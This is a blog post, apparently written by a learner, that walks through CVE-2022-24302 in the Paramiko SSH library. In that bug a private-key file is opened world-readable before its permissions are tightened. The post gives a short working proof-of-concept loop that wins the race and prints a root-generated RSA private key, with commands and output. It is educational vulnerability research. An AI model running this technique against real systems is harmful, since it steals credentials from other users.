---
title: "Exploring Race Condition: Developing a Simple Exploit for CVE-2022-24302"
date: 2025-07-08T21:35:37+07:00
toc: true
tags:
  - security
  - code review
author: "Nam Nguyen"
description: "Explore how race conditions are exploited by building an exploit yourself"
---

Inter-Process Communication (IPC) is a family of mechanisms that allows processes to communicate with each other. These mechanisms are very important in modern software. However, if the developers misimplement these mechanisms, it could lead to race conditions and allows hackers to exploit it for malicious purposes. Today, we'll develop an exploit for a file-based IPC vulnerability in the Paramiko library, which is an SSH implementation in Python, to learn more about race conditions.

> Note: This is an exploit for CVE-2022-24302

## The vulnerability

Paramiko can be used to build SSH clients. In this library (Version 2.10.0), we can see there's a `_write_private_key_file` function:

```python
def _write_private_key_file(self, filename, key, format, password=None):
  with open(filename, "w") as f:
      os.chmod(filename, o600)
      self._write_private_key(f, key, format, password=password)
```

This function is used to write the private key to a file. The vulnerability lies in the first 2 lines of the function. It opens the file in write mode and change the permission of the file to a less privileged permission. The `open` function opens the file in a globally readable state, then the `os.chmod` changes it to a read-write permission to only the user associated with the process.

The vulnerability is between the `open` and the `chmod`, because the private key file is globally readable, a lower-privileged user can also open and read the file. Even though the private key write occurs after the `chmod`, we can still read it. This is due to file permissions being checked only when you open the file, once the file is opened, even if the permission is changed, it won't delete the opened file descriptor. The permission change only have an effect on new file descriptors.

So in order to exploit this vulnerability, we need to open the file after the private key file is opened and before the permission of the private key file is changed. Once we have opened the file, we can wait for the key write and then read the private key.

## The exploit

I created this program that will generate a private key and write it to a file:

```python
import paramiko

key = paramiko.rsakey.RSAKey.generate(2048)
key.write_private_key_file("./private.key")
```

Now, we can create our exploit program:

```python
import time

while True:
    try:
        f = open("./private.key", "r")
        print("Private key file opened successfully.")
        time.sleep(0.01)
        print(f.read())
        break
    except:
        continue
```

This will continuously try to open the private key file. Once it has opened it, it will wait a little bit then read the file and print the private key.

Now for the actual exploit, we first run our exploit program as a lower-privileged user:

```bash
$ whoami
user
$ python exploit.py
```

Next, we run the generate key program as a super user:

```bash
$ sudo python gen_key.py
```

If we check the exploit program again, we can see that it has successfully read the private key file even though it doesn't have the permission to read it:

```bash
$ python exploit.py
Private key file opened successfully.
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----

$ cat private.key
cat: private.key: Permission denied
```

And voila, a race condition exploit on a real world vulnerability.

## Conclusion

IPC is used pretty much everywhere nowadays, making protection against IPC attacks vital. This file-based IPC exploit is a simple demonstration for how this kind of vulnerability can be exploited.

This was a rather short blog post. I'm currently learning about vulnerability research and I found race condition vulnerabilities to be pretty interesting so I wanted to make this blog post. I hope you enjoyed this and learned something from it.
